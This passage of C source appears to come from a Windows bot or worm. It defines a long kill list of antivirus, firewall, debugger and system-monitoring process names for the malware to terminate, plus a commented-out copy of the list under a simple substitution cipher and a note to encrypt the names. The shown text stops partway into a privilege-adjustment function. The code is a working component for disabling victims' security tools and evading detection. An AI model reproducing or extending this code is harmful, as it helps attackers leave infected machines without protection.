#ifndef NO_PROCESS

#include "processes.h"
#include "includes.h"
#include "define.h"
#include "extern.h"

// globals
#ifndef NO_AVFW_KILL
int killer_delay = 30000;

//FIX ME, ENCRYPT THESE!! Make this global
char *kill_list[] = {
		"ACKWIN32.EXE", "ADAWARE.EXE", "ADVXDWIN.EXE", "AGENTSVR.EXE", "AGENTW.EXE", "ALERTSVC.EXE", "ALEVIR.EXE", "ALOGSERV.EXE",
		"AMON9X.EXE", "ANTI-TROJAN.EXE", "ANTIVIRUS.EXE", "ANTS.EXE", "APIMONITOR.EXE", "APLICA32.EXE", "APVXDWIN.EXE",
		"ARR.EXE", "ATCON.EXE", "ATGUARD.EXE", "ATRO55EN.EXE", "ATUPDATER.EXE", "ATUPDATER.EXE", "ATWATCH.EXE", "AU.EXE",
		"AUPDATE.EXE", "AUPDATE.EXE", "AUTODOWN.EXE", "AUTODOWN.EXE", "AUTOTRACE.EXE", "AUTOTRACE.EXE", "AUTOUPDATE.EXE",
		"AUTOUPDATE.EXE", "AVCONSOL.EXE", "AVE32.EXE", "AVGCC32.EXE", "AVGCTRL.EXE", "AVGNT.EXE", "AVGSERV.EXE",
		"AVGSERV9.EXE", "AVGUARD.EXE", "AVGW.EXE", "AVKPOP.EXE", "AVKSERV.EXE", "AVKSERVICE.EXE", "AVKWCTl9.EXE",
		"AVLTMAIN.EXE", "AVNT.EXE", "AVP.EXE", "AVP32.EXE", "AVPCC.EXE", "AVPDOS32.EXE", "AVPM.EXE", "AVPTC32.EXE",
		"AVPUPD.EXE", "AVPUPD.EXE", "AVSCHED32.EXE", "AVSYNMGR.EXE", "AVWIN95.EXE", "AVWINNT.EXE", "AVWUPD.EXE",
		"AVWUPD32.EXE", "AVWUPD32.EXE", "AVWUPSRV.EXE", "AVXMONITOR9X.EXE", "AVXMONITORNT.EXE", "AVXQUAR.EXE",
		"AVXQUAR.EXE", "BACKWEB.EXE", "BARGAINS.EXE", "BD_PROFESSIONAL.EXE", "BEAGLE.EXE", "BELT.EXE", "BIDEF.EXE",
		"BIDSERVER.EXE", "BIPCP.EXE", "BIPCPEVALSETUP.EXE", "BISP.EXE", "BLACKD.EXE", "BLACKICE.EXE", "BLSS.EXE",
		"BOOTCONF.EXE", "BOOTWARN.EXE", "BORG2.EXE", "BPC.EXE", "BRASIL.EXE", "BS120.EXE", "BUNDLE.EXE", "BVT.EXE",
		"CCAPP.EXE", "CCEVTMGR.EXE", "CCPXYSVC.EXE", "CDP.EXE", "CFD.EXE", "CFGWIZ.EXE", "CFIADMIN.EXE", "CFIAUDIT.EXE",
		"CFIAUDIT.EXE", "CFINET.EXE", "CFINET32.EXE", "CLAW95CF.EXE", "CLEAN.EXE", "CLEANER.EXE", "CLEANER3.EXE",
		"CLEANPC.EXE", "CLICK.EXE", "CMD32.EXE", "CMESYS.EXE", "CMGRDIAN.EXE", "CMON016.EXE", "CONNECTIONMONITOR.EXE",
		"CPD.EXE", "CPF9X206.EXE", "CPFNT206.EXE", "CTRL.EXE", "CV.EXE", "CWNB181.EXE", "CWNTDWMO.EXE", "Claw95.EXE",
		"CLAW95CF.EXE", "DATEMANAGER.EXE", "DCOMX.EXE", "DEFALERT.EXE", "DEFSCANGUI.EXE", "DEFWATCH.EXE", "DEPUTY.EXE",
		"DIVX.EXE", "DLLCACHE.EXE", "DLLREG.EXE", "DOORS.EXE", "DPF.EXE", "DPFSETUP.EXE", "DPPS2.EXE", "DRWATSON.EXE",
		"DRWEB32.EXE", "DRWEBUPW.EXE", "DSSAGENT.EXE", "DVP95.EXE", "DVP95_0.EXE", "ECENGINE.EXE", "EFPEADM.EXE",
		"EMSW.EXE", "ENT.EXE", "ESAFE.EXE", "ESCANH95.EXE", "ESCANHNT.EXE", "ESCANV95.EXE", "ESPWATCH.EXE", "ETHEREAL.EXE",
		"ETRUSTCIPE.EXE", "EVPN.EXE", "EXANTIVIRUS-CNET.EXE", "EXE.AVXW.EXE", "EXPERT.EXE", "EXPLORE.EXE",
		"F-AGNT95.EXE", "F-PROT.EXE", "F-PROT95.EXE", "F-STOPW.EXE", "FAMEH32.EXE", "FAST.EXE", "FCH32.EXE", "FIH32.EXE",
		"FINDVIRU.EXE", "FIREWALL.EXE", "FLOWPROTECTOR.EXE", "FNRB32.EXE", "FP-WIN.EXE", "FP-WIN_TRIAL.EXE",
		"FPROT.EXE", "FRW.EXE", "FSAA.EXE", "FSAV.EXE", "FSAV32.EXE", "FSAV530STBYB.EXE", "FSAV530WTBYB.EXE", "FSAV95.EXE",
		"FSGK32.EXE", "FSM32.EXE", "FSMA32.EXE", "FSMB32.EXE", "GATOR.EXE", "GBMENU.EXE", "GBPOLL.EXE", "GENERICS.EXE",
		"GMT.EXE", "GUARD.EXE", "GUARDDOG.EXE", "HACKTRACERSETUP.EXE", "HBINST.EXE", "HBSRV.EXE", "HOTACTIO.EXE",
		"HOTPATCH.EXE", "HTLOG.EXE", "HTPATCH.EXE", "HWPE.EXE", "HXDL.EXE", "HXIUL.EXE", "IAMAPP.EXE", "IAMSERV.EXE",
		"IAMSTATS.EXE", "IBMASN.EXE", "IBMAVSP.EXE", "ICLOAD95.EXE", "ICLOADNT.EXE", "ICMON.EXE", "ICSUPP95.EXE",
		"ICSUPP95.EXE", "ICSUPPNT.EXE", "IDLE.EXE", "IEDLL.EXE", "IEDRIVER.EXE", "IEXPLORER.EXE", "IFACE.EXE",
		"IFW2000.EXE", "INETLNFO.EXE", "INFUS.EXE", "INFWIN.EXE", "INIT.EXE", "INTDEL.EXE", "INTREN.EXE", "IOMON98.EXE",
		"IPARMOR.EXE", "IRIS.EXE", "ISASS.EXE", "ISRV95.EXE", "ISTSVC.EXE", "JAMMER.EXE", "JDBGMRG.EXE", "JEDI.EXE",
		"KAVLITE40ENG.EXE", "KAVPERS40ENG.EXE", "KAVPF.EXE", "KAZZA.EXE", "KEENVALUE.EXE", "KERIO-PF-213-EN-WIN.EXE",
		"KERIO-WRL-421-EN-WIN.EXE", "KERIO-WRP-421-EN-WIN.EXE", "KERNEL32.EXE", "KILLPROCESSSETUP161.EXE",
		"LAUNCHER.EXE", "LDNETMON.EXE", "LDPRO.EXE", "LDPROMENU.EXE", "LDSCAN.EXE", "LNETINFO.EXE", "LOADER.EXE",
		"LOCALNET.EXE", "LOCKDOWN.EXE", "LOCKDOWN2000.EXE", "LOOKOUT.EXE", "LORDPE.EXE", "LSETUP.EXE", "LUALL.EXE",
		"LUALL.EXE", "LUAU.EXE", "LUCOMSERVER.EXE", "LUINIT.EXE", "LUSPT.EXE", "MAPISVC32.EXE", "MCAGENT.EXE", "MCMNHDLR.EXE",
		"MCSHIELD.EXE", "MCTOOL.EXE", "MCUPDATE.EXE", "MCUPDATE.EXE", "MCVSRTE.EXE", "MCVSSHLD.EXE", "MD.EXE", "MFIN32.EXE",
		"MFW2EN.EXE", "MFWENG3.02D30.EXE", "MGAVRTCL.EXE", "MGAVRTE.EXE", "MGHTML.EXE", "MGUI.EXE", "MINILOG.EXE",
		"MMOD.EXE", "MONITOR.EXE", "MOOLIVE.EXE", "MOSTAT.EXE", "MPFAGENT.EXE", "MPFSERVICE.EXE", "MPFTRAY.EXE",
		"MRFLUX.EXE", "MSAPP.EXE", "MSBB.EXE", "MSBLAST.EXE", "MSCACHE.EXE", "MSCCN32.EXE", "MSCMAN.EXE", "MSCONFIG.EXE",
		"MSDM.EXE", "MSDOS.EXE", "MSIEXEC16.EXE", "MSINFO32.EXE", "MSLAUGH.EXE", "MSMGT.EXE", "MSMSGRI32.EXE",
		"MSSMMC32.EXE", "MSSYS.EXE", "MSVXD.EXE", "MU0311AD.EXE", "MWATCH.EXE", "N32SCANW.EXE", "NAV.EXE",
		"AUTO-PROTECT.NAV80TRY.EXE", "NAVAP.NAVAPSVC.EXE", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NAVDX.EXE",
		"NAVENGNAVEX15.NAVLU32.EXE", "NAVLU32.EXE", "NAVNT.EXE", "NAVSTUB.EXE", "NAVW32.EXE", "NAVWNT.EXE",
		"NC2000.EXE", "NCINST4.EXE", "NDD32.EXE", "NEOMONITOR.EXE", "NEOWATCHLOG.EXE", "NETARMOR.EXE", "NETD32.EXE",
		"NETINFO.EXE", "NETMON.EXE", "NETSCANPRO.EXE", "NETSPYHUNTER-1.2.EXE", "NETSTAT.EXE", "NETUTILS.EXE",
		"NISSERV.EXE", "NISUM.EXE", "NMAIN.EXE", "NOD32.EXE", "NORMIST.EXE", "NORTON_INTERNET_SECU_3.0_407.EXE",
		"NOTSTART.EXE", "NPF40_TW_98_NT_ME_2K.EXE", "NPFMESSENGER.EXE", "NPROTECT.EXE", "NPSCHECK.EXE",
		"NPSSVC.EXE", "NSCHED32.EXE", "NSSYS32.EXE", "NSTASK32.EXE", "NSUPDATE.EXE", "NT.EXE", "NTRTSCAN.EXE", "NTVDM.EXE",
		"NTXconfig.EXE", "NUI.EXE", "NUPGRADE.EXE", "NUPGRADE.EXE", "NVARCH16.EXE", "NVC95.EXE", "NVSVC32.EXE",
		"NWINST4.EXE", "NWSERVICE.EXE", "NWTOOL16.EXE", "OLLYDBG.EXE", "ONSRVR.EXE", "OPTIMIZE.EXE", "OSTRONET.EXE",
		"OTFIX.EXE", "OUTPOST.EXE", "OUTPOST.EXE", "OUTPOSTINSTALL.EXE", "OUTPOSTPROINSTALL.EXE", "PADMIN.EXE",
		"PANIXK.EXE", "PATCH.EXE", "PAVCL.EXE", "PAVPROXY.EXE", "PAVSCHED.EXE", "PAVW.EXE", "PCC2002S902.EXE",
		"PCC2K_76_1436.EXE", "PCCIOMON.EXE", "PCCNTMON.EXE", "PCCWIN97.EXE", "PCCWIN98.EXE", "PCDSETUP.EXE",
		"PCFWALLICON.EXE", "PCIP10117_0.EXE", "PCSCAN.EXE", "PDSETUP.EXE", "PENIS.EXE", "PERISCOPE.EXE", "PERSFW.EXE",
		"PERSWF.EXE", "PF2.EXE", "PFWADMIN.EXE", "PGMONITR.EXE", "PINGSCAN.EXE", "PLATIN.EXE", "POP3TRAP.EXE", "POPROXY.EXE",
		"POPSCAN.EXE", "PORTDETECTIVE.EXE", "PORTMONITOR.EXE", "POWERSCAN.EXE", "PPINUPDT.EXE", "PPTBC.EXE",
		"PPVSTOP.EXE", "PRIZESURFER.EXE", "PRMT.EXE", "PRMVR.EXE", "PROCDUMP.EXE", "PROCESSMONITOR.EXE",
		"PROCEXPLORERV1.0.EXE", "PROGRAMAUDITOR.EXE", "PROPORT.EXE", "PROTECTX.EXE", "PSPF.EXE", "PURGE.EXE",
		"PUSSY.EXE", "PVIEW95.EXE", "QCONSOLE.EXE", "QSERVER.EXE", "RAPAPP.EXE", "RAV7.EXE", "RAV7WIN.EXE",
		"RAV8WIN32ENG.EXE", "RAY.EXE", "RB32.EXE", "RCSYNC.EXE", "REALMON.EXE", "REGED.EXE", "REGEDIT.EXE", "REGEDT32.EXE",
		"RESCUE.EXE", "RESCUE32.EXE", "RRGUARD.EXE", "RSHELL.EXE", "RTVSCAN.EXE", "RTVSCN95.EXE", "RULAUNCH.EXE",
		"RUN32DLL.EXE", "RUNDLL.EXE", "RUNDLL16.EXE", "RUXDLL32.EXE", "SAFEWEB.EXE", "SAHAGENT.EXE", "SAVE.EXE",
		"SAVENOW.EXE", "SBSERV.EXE", "SC.EXE", "SCAM32.EXE", "SCAN32.EXE", "SCAN95.EXE", "SCANPM.EXE", "SCRSCAN.EXE",
		"SCRSVR.EXE", "SCVHOST.EXE", "SD.EXE", "SERV95.EXE", "SERVICE.EXE", "SERVLCE.EXE", "SERVLCES.EXE",
		"SETUPVAMEEVAL.EXE", "SETUP_FLOWPROTECTOR_US.EXE", "SFC.EXE", "SGSSFW32.EXE", "SH.EXE",
		"SHELLSPYINSTALL.EXE", "SHN.EXE", "SHOWBEHIND.EXE", "SMC.EXE", "SMS.EXE", "SMSS32.EXE", "SOAP.EXE", "SOFI.EXE",
		"SPERM.EXE", "SPF.EXE", "SPHINX.EXE", "SPOLER.EXE", "SPOOLCV.EXE", "SPOOLSV32.EXE", "SPYXX.EXE", "SREXE.EXE",
		"SRNG.EXE", "SS3EDIT.EXE", "SSGRATE.EXE", "SSG_4104.EXE", "ST2.EXE", "START.EXE", "STCLOADER.EXE", "SUPFTRL.EXE",
		"SUPPORT.EXE", "SUPPORTER5.EXE", "SVC.EXE", "SVCHOSTC.EXE", "SVCHOSTS.EXE", "SVSHOST.EXE", "SWEEP95.EXE",
		"SWEEPNET.SWEEPSRV.SYS.SWNETSUP.EXE", "SYMPROXYSVC.EXE", "SYMTRAY.EXE", "SYSEDIT.EXE", "SYSTEM.EXE",
		"SYSTEM32.EXE", "SYSUPD.EXE", "TASKMG.EXE", "TASKMO.EXE", "TASKMON.EXE", "TAUMON.EXE", "TBSCAN.EXE", "TC.EXE",
		"TCA.EXE", "TCM.EXE", "TDS-3.EXE", "TDS2-98.EXE", "TDS2-NT.EXE", "TEEKIDS.EXE", "TFAK.EXE", "TFAK5.EXE", "TGBOB.EXE",
		"TITANIN.EXE", "TITANINXP.EXE", "TRACERT.EXE", "TRICKLER.EXE", "TRJSCAN.EXE", "TRJSETUP.EXE", "TROJANTRAP3.EXE",
		"TSADBOT.EXE", "TVMD.EXE", "TVTMD.EXE", "UNDOBOOT.EXE", "UPDAT.EXE", "UPDATE.EXE", "UPDATE.EXE", "UPGRAD.EXE",
		"UTPOST.EXE", "VBCMSERV.EXE", "VBCONS.EXE", "VBUST.EXE", "VBWIN9X.EXE", "VBWINNTW.EXE", "VCSETUP.EXE", "VET32.EXE",
		"VET95.EXE", "VETTRAY.EXE", "VFSETUP.EXE", "VIR-HELP.EXE", "VIRUSMDPERSONALFIREWALL.EXE", "VNLAN300.EXE",
		"VNPC3000.EXE", "VPC32.EXE", "VPC42.EXE", "VPFW30S.EXE", "VPTRAY.EXE", "VSCAN40.EXE", "VSCENU6.02D30.EXE",
		"VSCHED.EXE", "VSECOMR.EXE", "VSHWIN32.EXE", "VSISETUP.EXE", "VSMAIN.EXE", "VSMON.EXE", "VSSTAT.EXE",
		"VSWIN9XE.EXE", "VSWINNTSE.EXE", "VSWINPERSE.EXE", "W32DSM89.EXE", "W9X.EXE", "WATCHDOG.EXE", "WEBDAV.EXE",
		"WEBSCANX.EXE", "WEBTRAP.EXE", "WFINDV32.EXE", "WGFE95.EXE", "WHOSWATCHINGME.EXE", "WIMMUN32.EXE",
		"WIN-BUGSFIX.EXE", "WIN32.EXE", "WIN32US.EXE", "WINACTIVE.EXE", "WINDOW.EXE", "WINDOWS.EXE", "WININETD.EXE",
		"WININIT.EXE", "WININITX.EXE", "WINLOGIN.EXE", "WINMAIN.EXE", "WINNET.EXE", "WINPPR32.EXE", "WINRECON.EXE",
		"WINSERVN.EXE", "WINSSK32.EXE", "WINSTART.EXE", "WINSTART001.EXE", "WINTSK32.EXE", "WINUPDATE.EXE",
		"WKUFIND.EXE", "WNAD.EXE", "WNT.EXE", "WRADMIN.EXE", "WRCTRL.EXE", "WSBGATE.EXE", "WUPDATER.EXE", "WUPDT.EXE",
		"WYVERNWORKSFIREWALL.EXE", "XPF202EN.EXE", "ZAPRO.EXE", "ZAPSETUP3001.EXE", "ZATUTOR.EXE", "ZONALM2601.EXE",
		"ZONEALARM.EXE", "_AVP32.EXE", "_AVPCC.EXE", "_AVPM.EXE", "HIJACKTHIS.EXE", "F-AGOBOT.EXE", "PandaAVEngine.exe",
		"sysinfo.exe", "mscvb32.exe",	"Penis32.exe", "bbeagle.exe", "SysMonXP.exe", "winupd.exe", "winsys.exe", "ssate.exe",
		"rate.exe", "d3dupdate.exe", "irun4.exe", "i11r54n4.exe"
/*
	"fknqdp32.aia", "fbfqfza.aia", "fblibqdp.aia", "ftapsvlz.aia", "ftapsq.aia", "fjazsvlk.aia", "fjaldz.aia", "fjetvazl.aia",
	"fmep9i.aia", "fpsd-szehfp.aia", "fpsdldzcv.aia", "fpsv.aia", "frdmepdsez.aia", "frjdkf32.aia", "frlibqdp.aia",
	"fzz.aia", "fskep.aia", "fstcfzb.aia", "fsze55ap.aia", "fscrbfsaz.aia", "fscrbfsaz.aia", "fsqfsky.aia", "fc.aia",
	"fcrbfsa.aia", "fcrbfsa.aia", "fcsebeqp.aia", "fcsebeqp.aia", "fcseszfka.aia", "fcseszfka.aia", "fcsecrbfsa.aia",
	"fcsecrbfsa.aia", "flkepvej.aia", "fla32.aia", "fltkk32.aia", "fltkszj.aia", "fltps.aia", "fltvazl.aia",
	"fltvazl9.aia", "fltcfzb.aia", "fltq.aia", "flnrer.aia", "flnvazl.aia", "flnvazldka.aia", "flnqksj9.aia",
	"fljsmfdp.aia", "flps.aia", "flr.aia", "flr32.aia", "flrkk.aia", "flrbev32.aia", "flrm.aia", "flrsk32.aia",
	"flrcrb.aia", "flrcrb.aia", "flvkyab32.aia", "flvxpmtz.aia", "flqdp95.aia", "flqdpps.aia", "flqcrb.aia",
	"flqcrb32.aia", "flqcrb32.aia", "flqcrvzl.aia", "flimepdsez9i.aia", "flimepdsezps.aia", "fliwcfz.aia",
	"fliwcfz.aia", "ofknqao.aia", "ofztfdpv.aia", "ob_rzegavvdepfj.aia", "oaftja.aia", "oajs.aia", "odbag.aia",
	"odbvazlaz.aia", "odrkr.aia", "odrkralfjvascr.aia", "odvr.aia", "ojfknb.aia", "ojfkndka.aia", "ojvv.aia",
	"oeeskepg.aia", "oeesqfzp.aia", "oezt2.aia", "ork.aia", "ozfvdj.aia", "ov120.aia", "ocpbja.aia", "ols.aia",
	"kkfrr.aia", "kkalsmtz.aia", "kkrixvlk.aia", "kbr.aia", "kgb.aia", "kgtqdu.aia", "kgdfbmdp.aia", "kgdfcbds.aia",
	"kgdfcbds.aia", "kgdpas.aia", "kgdpas32.aia", "kjfq95kg.aia", "kjafp.aia", "kjafpaz.aia", "kjafpaz3.aia",
	"kjafprk.aia", "kjdkn.aia", "kmb32.aia", "kmavxv.aia", "kmtzbdfp.aia", "kmep016.aia", "keppaksdepmepdsez.aia",
	"krb.aia", "krg9i206.aia", "krgps206.aia", "kszj.aia", "kl.aia", "kqpo181.aia", "kqpsbqme.aia", "kjfq95.aia",
	"kjfq95kg.aia", "bfsamfpftaz.aia", "bkemi.aia", "bagfjazs.aia", "bagvkfptcd.aia", "bagqfsky.aia", "barcsx.aia",
	"bdli.aia", "bjjkfkya.aia", "bjjzat.aia", "beezv.aia", "brg.aia", "brgvascr.aia", "brrv2.aia", "bzqfsvep.aia",
	"bzqao32.aia", "bzqaocrq.aia", "bvvftaps.aia", "blr95.aia", "blr95_0.aia", "akaptdpa.aia", "agrafbm.aia",
	"amvq.aia", "aps.aia", "avfga.aia", "avkfpy95.aia", "avkfpyps.aia", "avkfpl95.aia", "avrqfsky.aia", "asyazafj.aia",
	"aszcvskdra.aia", "alrp.aia", "aifpsdldzcv-kpas.aia", "aia.fliq.aia", "airazs.aia", "airjeza.aia",
	"g-ftps95.aia", "g-rzes.aia", "g-rzes95.aia", "g-vserq.aia", "gfmay32.aia", "gfvs.aia", "gky32.aia", "gdy32.aia",
	"gdpbldzc.aia", "gdzaqfjj.aia", "gjeqrzesaksez.aia", "gpzo32.aia", "gr-qdp.aia", "gr-qdp_szdfj.aia",
	"grzes.aia", "gzq.aia", "gvff.aia", "gvfl.aia", "gvfl32.aia", "gvfl530vsoxo.aia", "gvfl530qsoxo.aia", "gvfl95.aia",
	"gvtn32.aia", "gvm32.aia", "gvmf32.aia", "gvmo32.aia", "tfsez.aia", "tomapc.aia", "torejj.aia", "tapazdkv.aia",
	"tms.aia", "tcfzb.aia", "tcfzbbet.aia", "yfknszfkazvascr.aia", "yodpvs.aia", "yovzl.aia", "yesfksde.aia",
	"yesrfsky.aia", "ysjet.aia", "ysrfsky.aia", "yqra.aia", "yibj.aia", "yidcj.aia", "dfmfrr.aia", "dfmvazl.aia",
	"dfmvsfsv.aia", "domfvp.aia", "domflvr.aia", "dkjefb95.aia", "dkjefbps.aia", "dkmep.aia", "dkvcrr95.aia",
	"dkvcrr95.aia", "dkvcrrps.aia", "dbja.aia", "dabjj.aia", "dabzdlaz.aia", "dairjezaz.aia", "dgfka.aia",
	"dgq2000.aia", "dpasjpge.aia", "dpgcv.aia", "dpgqdp.aia", "dpds.aia", "dpsbaj.aia", "dpszap.aia", "demep98.aia",
	"drfzmez.aia", "dzdv.aia", "dvfvv.aia", "dvzl95.aia", "dvsvlk.aia", "hfmmaz.aia", "hbotmzt.aia", "habd.aia",
	"nfljdsa40apt.aia", "nflrazv40apt.aia", "nflrg.aia", "nfuuf.aia", "naaplfjca.aia", "nazde-rg-213-ap-qdp.aia",
	"nazde-qzj-421-ap-qdp.aia", "nazde-qzr-421-ap-qdp.aia", "nazpaj32.aia", "ndjjrzekavvvascr161.aia",
	"jfcpkyaz.aia", "jbpasmep.aia", "jbrze.aia", "jbrzemapc.aia", "jbvkfp.aia", "jpasdpge.aia", "jefbaz.aia",
	"jekfjpas.aia", "jeknbeqp.aia", "jeknbeqp2000.aia", "jeenecs.aia", "jezbra.aia", "jvascr.aia", "jcfjj.aia",
	"jcfjj.aia", "jcfc.aia", "jckemvazlaz.aia", "jcdpds.aia", "jcvrs.aia", "mfrdvlk32.aia", "mkftaps.aia", "mkmpybjz.aia",
	"mkvydajb.aia", "mkseej.aia", "mkcrbfsa.aia", "mkcrbfsa.aia", "mklvzsa.aia", "mklvvyjb.aia", "mb.aia", "mgdp32.aia",
	"mgq2ap.aia", "mgqapt3.02b30.aia", "mtflzskj.aia", "mtflzsa.aia", "mtysmj.aia", "mtcd.aia", "mdpdjet.aia",
	"mmeb.aia", "mepdsez.aia", "meejdla.aia", "mevsfs.aia", "mrgftaps.aia", "mrgvazldka.aia", "mrgszfx.aia",
	"mzgjci.aia", "mvfrr.aia", "mvoo.aia", "mvojfvs.aia", "mvkfkya.aia", "mvkkp32.aia", "mvkmfp.aia", "mvkepgdt.aia",
	"mvbm.aia", "mvbev.aia", "mvdaiak16.aia", "mvdpge32.aia", "mvjfcty.aia", "mvmts.aia", "mvmvtzd32.aia",
	"mvvmmk32.aia", "mvvxv.aia", "mvlib.aia", "mc0311fb.aia", "mqfsky.aia", "p32vkfpq.aia", "pfl.aia",
	"fcse-rzesaks.pfl80szx.aia", "pflfr.pflfrvlk.aia", "pflfrvlk.aia", "pflfrq32.aia", "pflbi.aia",
	"pflaptpflai15.pfljc32.aia", "pfljc32.aia", "pflps.aia", "pflvsco.aia", "pflq32.aia", "pflqps.aia",
	"pk2000.aia", "pkdpvs4.aia", "pbb32.aia", "paemepdsez.aia", "paeqfskyjet.aia", "pasfzmez.aia", "pasb32.aia",
	"pasdpge.aia", "pasmep.aia", "pasvkfprze.aia", "pasvrxycpsaz-1.2.aia", "pasvsfs.aia", "pascsdjv.aia",
	"pdvvazl.aia", "pdvcm.aia", "pmfdp.aia", "peb32.aia", "pezmdvs.aia", "pezsep_dpsazpas_vakc_3.0_407.aia",
	"pesvsfzs.aia", "prg40_sq_98_ps_ma_2n.aia", "prgmavvaptaz.aia", "przesaks.aia", "prvkyakn.aia",
	"prvvlk.aia", "pvkyab32.aia", "pvvxv32.aia", "pvsfvn32.aia", "pvcrbfsa.aia", "ps.aia", "pszsvkfp.aia", "pslbm.aia",
	"psikepgdt.aia", "pcd.aia", "pcrtzfba.aia", "pcrtzfba.aia", "plfzky16.aia", "plk95.aia", "plvlk32.aia",
	"pqdpvs4.aia", "pqvazldka.aia", "pqseej16.aia", "ejjxbot.aia", "epvzlz.aia", "ersdmdua.aia", "evszepas.aia",
	"esgdi.aia", "ecsrevs.aia", "ecsrevs.aia", "ecsrevsdpvsfjj.aia", "ecsrevsrzedpvsfjj.aia", "rfbmdp.aia",
	"rfpdin.aia", "rfsky.aia", "rflkj.aia", "rflrzeix.aia", "rflvkyab.aia", "rflq.aia", "rkk2002v902.aia",
	"rkk2n_76_1436.aia", "rkkdemep.aia", "rkkpsmep.aia", "rkkqdp97.aia", "rkkqdp98.aia", "rkbvascr.aia",
	"rkgqfjjdkep.aia", "rkdr10117_0.aia", "rkvkfp.aia", "rbvascr.aia", "rapdv.aia", "razdvkera.aia", "razvgq.aia",
	"razvqg.aia", "rg2.aia", "rgqfbmdp.aia", "rtmepdsz.aia", "rdptvkfp.aia", "rjfsdp.aia", "rer3szfr.aia", "rerzeix.aia",
	"rervkfp.aia", "rezsbasaksdla.aia", "rezsmepdsez.aia", "reqazvkfp.aia", "rrdpcrbs.aia", "rrsok.aia",
	"rrlvser.aia", "rzduavczgaz.aia", "rzms.aia", "rzmlz.aia", "rzekbcmr.aia", "rzekavvmepdsez.aia",
	"rzekairjezazl1.0.aia", "rzetzfmfcbdsez.aia", "rzerezs.aia", "rzesaksi.aia", "rvrg.aia", "rczta.aia",
	"rcvvx.aia", "rldaq95.aia", "wkepveja.aia", "wvazlaz.aia", "zfrfrr.aia", "zfl7.aia", "zfl7qdp.aia",
	"zfl8qdp32apt.aia", "zfx.aia", "zo32.aia", "zkvxpk.aia", "zafjmep.aia", "zatab.aia", "zatabds.aia", "zatabs32.aia",
	"zavkca.aia", "zavkca32.aia", "zztcfzb.aia", "zvyajj.aia", "zslvkfp.aia", "zslvkp95.aia", "zcjfcpky.aia",
	"zcp32bjj.aia", "zcpbjj.aia", "zcpbjj16.aia", "zcibjj32.aia", "vfgaqao.aia", "vfyftaps.aia", "vfla.aia",
	"vflapeq.aia", "vovazl.aia", "vk.aia", "vkfm32.aia", "vkfp32.aia", "vkfp95.aia", "vkfprm.aia", "vkzvkfp.aia",
	"vkzvlz.aia", "vklyevs.aia", "vb.aia", "vazl95.aia", "vazldka.aia", "vazljka.aia", "vazljkav.aia",
	"vascrlfmaalfj.aia", "vascr_gjeqrzesaksez_cv.aia", "vgk.aia", "vtvvgq32.aia", "vy.aia",
	"vyajjvrxdpvsfjj.aia", "vyp.aia", "vyeqoaydpb.aia", "vmk.aia", "vmv.aia", "vmvv32.aia", "vefr.aia", "vegd.aia",
	"vrazm.aia", "vrg.aia", "vrydpi.aia", "vrejaz.aia", "vreejkl.aia", "vreejvl32.aia", "vrxii.aia", "vzaia.aia",
	"vzpt.aia", "vv3abds.aia", "vvtzfsa.aia", "vvt_4104.aia", "vs2.aia", "vsfzs.aia", "vskjefbaz.aia", "vcrgszj.aia",
	"vcrrezs.aia", "vcrrezsaz5.aia", "vlk.aia", "vlkyevsk.aia", "vlkyevsv.aia", "vlvyevs.aia", "vqaar95.aia",
	"vqaarpas.vqaarvzl.vxv.vqpasvcr.aia", "vxmrzeixvlk.aia", "vxmszfx.aia", "vxvabds.aia", "vxvsam.aia",
	"vxvsam32.aia", "vxvcrb.aia", "sfvnmt.aia", "sfvnme.aia", "sfvnmep.aia", "sfcmep.aia", "sovkfp.aia", "sk.aia",
	"skf.aia", "skm.aia", "sbv-3.aia", "sbv2-98.aia", "sbv2-ps.aia", "saandbv.aia", "sgfn.aia", "sgfn5.aia", "stoeo.aia",
	"sdsfpdp.aia", "sdsfpdpir.aia", "szfkazs.aia", "szdknjaz.aia", "szhvkfp.aia", "szhvascr.aia", "szehfpszfr3.aia",
	"svfboes.aia", "slmb.aia", "slsmb.aia", "cpbeoees.aia", "crbfs.aia", "crbfsa.aia", "crbfsa.aia", "crtzfb.aia",
	"csrevs.aia", "lokmvazl.aia", "lokepv.aia", "locvs.aia", "loqdp9i.aia", "loqdppsq.aia", "lkvascr.aia", "las32.aia",
	"las95.aia", "lasszfx.aia", "lgvascr.aia", "ldz-yajr.aia", "ldzcvmbrazvepfjgdzaqfjj.aia", "lpjfp300.aia",
	"lprk3000.aia", "lrk32.aia", "lrk42.aia", "lrgq30v.aia", "lrszfx.aia", "lvkfp40.aia", "lvkapc6.02b30.aia",
	"lvkyab.aia", "lvakemz.aia", "lvyqdp32.aia", "lvdvascr.aia", "lvmfdp.aia", "lvmep.aia", "lvvsfs.aia",
	"lvqdp9ia.aia", "lvqdppsva.aia", "lvqdprazva.aia", "q32bvm89.aia", "q9i.aia", "qfskybet.aia", "qaobfl.aia",
	"qaovkfpi.aia", "qaoszfr.aia", "qgdpbl32.aia", "qtga95.aia", "qyevqfskydptma.aia", "qdmmcp32.aia",
	"qdp-octvgdi.aia", "qdp32.aia", "qdp32cv.aia", "qdpfksdla.aia", "qdpbeq.aia", "qdpbeqv.aia", "qdpdpasb.aia",
	"qdpdpds.aia", "qdpdpdsi.aia", "qdpjetdp.aia", "qdpmfdp.aia", "qdppas.aia", "qdprrz32.aia", "qdpzakep.aia",
	"qdpvazlp.aia", "qdpvvn32.aia", "qdpvsfzs.aia", "qdpvsfzs001.aia", "qdpsvn32.aia", "qdpcrbfsa.aia",
	"qncgdpb.aia", "qpfb.aia", "qps.aia", "qzfbmdp.aia", "qzkszj.aia", "qvotfsa.aia", "qcrbfsaz.aia", "qcrbs.aia",
	"qxlazpqeznvgdzaqfjj.aia", "irg202ap.aia", "ufrze.aia", "ufrvascr3001.aia", "ufscsez.aia", "uepfjm2601.aia",
	"uepafjfzm.aia", "_flr32.aia", "_flrkk.aia", "_flrm.aia", "ydhfknsydv.aia", "g-fteoes.aia", "rfpbfflaptdpa.aia",
	"vxvdpge.aia", "mvklo32.aia", "rapdv32.aia", "ooaftja.aia", "vxvmepir.aia", "qdpcrb.aia", "qdpvxv.aia", "vvfsa.aia",
	"zfsa.aia", "b3bcrbfsa.aia", "dzcp4.aia", "d11z54p4.aia"
*/
};
#endif

BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
	HANDLE hToken;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return bRet;

